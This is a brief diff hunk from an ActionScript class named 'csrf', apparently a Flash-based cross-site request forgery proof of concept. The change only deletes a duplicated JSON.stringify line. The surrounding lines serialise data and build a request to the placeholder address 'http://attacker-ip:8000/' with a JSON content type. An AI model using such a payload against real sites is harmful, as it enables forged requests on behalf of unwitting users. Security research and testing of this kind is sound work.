@@ -19,7 +19,6 @@ public class csrf extends Sprite
       };
       var myData:Object = member1;
       myJson = JSON.stringify(myData);
-      myJson = JSON.stringify(myData);
       var url:String = "http://attacker-ip:8000/";
       var request:URLRequest = new URLRequest(url);
       request.requestHeaders.push(new URLRequestHeader("Content-Type","application/json"));
